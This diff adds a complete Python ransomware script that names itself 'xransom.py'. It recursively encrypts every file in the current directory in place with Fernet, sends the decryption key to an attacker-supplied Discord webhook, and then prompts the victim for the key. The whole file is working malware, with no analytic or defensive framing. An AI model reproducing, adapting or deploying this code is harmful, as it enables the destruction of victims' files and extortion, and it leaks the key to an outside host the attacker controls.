@@ -1,0 +1,64 @@
+import os
+import random
+import string
+from cryptography.fernet import Fernet
+import requests
+
+# Generate a random decryption key
+def generate_key():
+    key = Fernet.generate_key()
+    return key
+
+# Encrypt a file using the Fernet cipher
+def encrypt_file(file_path, key):
+    with open(file_path, 'rb') as file:
+        data = file.read()
+    f = Fernet(key)
+    encrypted_data = f.encrypt(data)
+    with open(file_path, 'wb') as file:
+        file.write(encrypted_data)
+
+# Decrypt a file using the Fernet cipher
+def decrypt_file(file_path, key):
+    with open(file_path, 'rb') as file:
+        encrypted_data = file.read()
+    f = Fernet(key)
+    decrypted_data = f.decrypt(encrypted_data)
+    with open(file_path, 'wb') as file:
+        file.write(decrypted_data)
+
+# Send the decryption key to a Discord webhook
+def send_to_discord(key, webhook_url):
+    data = {"content": f"Decryption key: {key.decode()}"}
+    response = requests.post(webhook_url, json=data)
+
+# Main function
+def main():
+    key = generate_key()
+    webhook_url = "PUT YOUR WEBHOOK HERE"
+
+    # Encrypt all files in the current directory except for the ransomware script and installer.bat
+    for root, dirs, files in os.walk('.'):
+        for file in files:
+            if file != 'xransom.py' and file != 'installer.bat':
+                file_path = os.path.join(root, file)
+                encrypt_file(file_path, key)
+
+    # Send the decryption key to the Discord webhook
+    send_to_discord(key, webhook_url)
+
+    # Prompt the user for the decryption key
+    user_key = input("Enter the decryption key to decrypt the files: ")
+    if user_key == key.decode():
+        # Decrypt all files
+        for root, dirs, files in os.walk('.'):
+            for file in files:
+                if file != 'xransom.py' and file != 'installer.bat':
+                    file_path = os.path.join(root, file)
+                    decrypt_file(file_path, key)
+        print("Files decrypted successfully.")
+    else:
+        print("Incorrect decryption key. Files are still encrypted.")
+
+if __name__ == '__main__':
+    main()
